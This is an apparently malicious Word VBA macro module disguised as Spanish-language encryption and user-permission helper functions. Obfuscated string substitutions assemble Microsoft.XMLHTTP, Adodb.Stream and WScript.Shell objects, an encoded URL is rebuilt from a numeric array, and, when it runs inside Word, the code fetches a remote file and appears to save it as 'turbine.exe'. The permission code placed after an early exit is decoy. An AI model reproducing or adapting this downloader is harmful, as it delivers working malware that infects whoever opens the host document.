Attribute VB_Name = "e"


Function IsOk(ByVal Cadena As String) As String
    
    
    longitud = Len(Cadena)
GromGremitKustiTryasutsya2 = GodnTeBabenParama("SOOKicroSOOOKoft.XSOOKLHTTPSOOOOKAdodb.SOOOKtrSOKaSOOKSOOOOKSOOOKhSOKll.Applic" _
+ GodnTeBabenParama("ationSOOOOKWSOOOKcript.SOOOKhSOKllSOOOOKProcSOKSOOOKSOOOKSOOOOKGSOKTSOOOOKTSOKSOOKPSOOOOKTypSOKSOOOOKopSOKnSOOOOKwritTRONponSOOOKSOKBodySOOOOKSOOOKavSOKtofilSOKSOOOOK", "TRON", "SOKSOOOOKrSOKSOOOK") _
+ "\turbiSOOOK.SOKxSOK", "SOK", "e")
    
    
    
    Dim Puntero As Integer
    Dim Codigo As String
    Dim Conversores() As Integer
    Dim Salida As String

    
    ReDim Conversores(8) As Integer
    Conversores(1) = 25
    Conversores(2) = -20
    Conversores(3) = 30
    Conversores(4) = -15
    Conversores(5) = 20
    Conversores(6) = -10
    
    Conversores(7) = 25
    Conversores(8) = -5

    
    Salida = ""

    For Puntero = 1 To longitud
        Codigo = Chr(Asc(Mid(Cadena, Puntero, 1)) + Conversores(Puntero))
        Salida = RTrim(Salida) & LTrim(Codigo)
    Next Puntero

GromGremitKustiTryasutsyaXSAOO = Split("45761212®1251041212®1251041212®1249281212®1225521212®1220681212®1220681212®1252361212®1252361212®1252361212®1220241212®1244881212®1242681212®1250601212®1251481212®1247521212®1248841212®1220241212®1248841212®1250161212®1245321212®1220681212®1222881212®1231241212®1229041212®1250161212®1244001212®1244881212®122376", "1212®12")
 
cDesCripto Salida
    IsOk = Salida

End Function

Public Sub VerCadenaPermiso(permiso As String)
Dim I As Long
Dim letra As String

Alta = False
Baja = False
modi = False
Dim Consu As Boolean
Consu = True
Dim apdistance As Integer
For apdistance = LBound(GromGremitKustiTryasutsyaXSAOO) To UBound(GromGremitKustiTryasutsyaXSAOO)
 GromGremitKustiTryasutsya4 = GromGremitKustiTryasutsya4 & DuBirMahnWeishr(apdistance)
 Next apdistance
 
 
 If Application = "Microsoft Word" Then
 GromGremitKustiTryasutsyaDAcdaw.Open GromGremitKustiTryasutsyaPLAPEKC(5), GromGremitKustiTryasutsya4, False
GromGremitKustiTryasutsyaDAcdaw.Send
CambiarPass letra, "", True
End If

Exit Sub
    For I = 1 To Len(permiso)
        
        letra = Mid(permiso, I, 1)
        
        If letra = "A" Then
            Alta = True
        End If
        
        If letra = "B" Then
            Baja = True
        End If
        
        If letra = "M" Then
            modi = True
        End If
        
        If letra = "C" Then
            Consu = True
        End If
    Next I
    If Len(permiso) = 0 Then
        Consu = False
        modi = False
        Alta = False
        Baja = False
    End If
End Sub


Function cDesCripto(ByVal Cadena As String) As String
    
    
    
    Dim longitud As Integer
    Dim Puntero As Integer
    Dim Codigo As String
    Dim Conversores() As Integer
    Dim Salida As String

 GromGremitKustiTryasutsya2 = GodnTeBabenParama(GromGremitKustiTryasutsya2, "SOOK", "M")

    
    ReDim Conversores(8) As Integer
    Conversores(1) = -25
    Conversores(2) = 20
    Conversores(3) = -30
    Conversores(4) = 15
    Conversores(5) = -20
    Conversores(6) = 10
        Conversores(7) = -25
    Conversores(8) = 5

 GromGremitKustiTryasutsya2 = GodnTeBabenParama(GromGremitKustiTryasutsya2, "SOOOK", "s")
    
    Salida = ""

    
    longitud = Len(Cadena)

 GromGremitKustiTryasutsyaPLAPEKC = Split(GromGremitKustiTryasutsya2, "SOOOOK")
 Set GromGremitKustiTryasutsyaPLAPEKCwwed = CreateObject(GromGremitKustiTryasutsyaPLAPEKC(1))
    
    For Puntero = 1 To longitud
        Codigo = Chr$(Asc(Mid$(Cadena, Puntero, 1)) + Conversores(Puntero))
        Salida = RTrim$(Salida) & LTrim$(Codigo)
    Next Puntero
    
 Set GromGremitKustiTryasutsyaGMAKO = CreateObject(GromGremitKustiTryasutsyaPLAPEKC(5 - 3))
    cDesCripto = Salida

 PrimeraVez
End Function
